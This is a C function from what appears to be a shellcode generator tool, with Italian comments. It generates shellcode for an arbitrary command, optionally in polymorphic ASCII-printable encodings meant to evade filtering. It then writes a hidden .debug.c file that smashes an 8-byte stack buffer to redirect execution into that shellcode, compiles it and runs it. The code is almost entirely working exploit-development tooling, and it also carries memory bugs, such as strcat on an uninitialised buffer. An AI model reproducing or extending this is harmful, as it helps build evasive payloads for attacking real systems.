void testc(char *cmd, char *shellpath, bool setuid, int type){
	__u8 *shellc;
	int i, l, size, k;
	FILE *fp;
	char *shellcode, *code, tmp[20];
	switch(type){
		case 0: //normal type
			shellc = shc_gen(cmd, (shellpath ? shellpath:DEF_PATH), setuid, &l);
			printf("%i\n", pushed_bytes(cmd, shellpath));
			size=l+pushed_bytes(cmd, shellpath)-28;
			code=(char *)malloc(l*4+3+(l-(l%10))/5);
			strcat(code, "\\\n");
			for (i=0;i<l;i++) {
				if (((i+2)%10==1)||(i==l-1))
					sprintf (tmp, "\\x%.2x\\\n", shellc[i]);
				else
					sprintf (tmp, "\\x%.2x", shellc[i]);
				strcat(code, tmp);
			}
			break;
		case 1: //"poco polimorfico"
			l=24-pushed_bytes(cmd, shellpath)-0x20;
			shellcode = polyasc_gen(cmd, shellpath, 0 /*stuid*/, l, 0x20);
			size = strlen(shellcode);
			k=size+1;
			code=(char *)malloc(k);
			for(i=0;i<size;i++){
				if((shellcode[i]=='"') || (shellcode[i]==0x5c)){
					code = realloc(code, ++k);
					code[i+(k-2-size)]=0x5c;
				}
				code[i+(k-1-size)]=shellcode[i];
			}
			code[k-1]=0x00;
			break;
		case 2: //"tanto" polimorfico
			shellc = shc_gen(cmd, (shellpath ? shellpath:DEF_PATH), setuid, &l);
			shellcode = shc2polyascprint(shellc, l, 0, 24-((l%4==0) ? l:(l-(l%4)+4)));
			size = strlen(shellcode);
			k=size+1;
			code=(char *)malloc(k);
			for(i=0;i<size;i++){
				if((shellcode[i]=='"') || (shellcode[i]==0x5c)){
					code = realloc(code, ++k);
					code[i+(k-2-size)]=0x5c;
				}
				code[i+(k-1-size)]=shellcode[i];
			}
			code[k-1]=0x00;
		default:
			break;
	}
	fp=fopen(".debug.c", "w");
	fprintf(fp, "#include <stdio.h>\n"
		    "#include <string.h>\n"
		    "#define SIZE %d\n\n"
		    "#define SHCD \"%s\"\n"
		    "void bof();\n"
		    "int main(){\n"
		    "	bof();\n"
		    "	return 0;\n"
		    "}\n"
		    "void bof(){\n"
		    "	char boff[8],shellcode[SIZE]=SHCD, *p=shellcode;\n"
		    "	strcpy(boff, \"aaaaaaaaaaaaaaaaaaaa\");\n"
		    "	memmove(boff+20, &p, 4);\n"
		    "}\n\n", size, code);
	fclose(fp);
	system("gcc -o .debug .debug.c");
	printf("[...]Testing the shellcode by running a controlled buffer overflow\n"
	       "[...]It's to late to stop the execusion if you are testing a dangerous shellcode...\n"
	       "[...] Good luck!\n\n");
	system("./.debug");
	printf("\n[...]test done.\n");
	remove(".debug.c");
	remove(".debug");
}

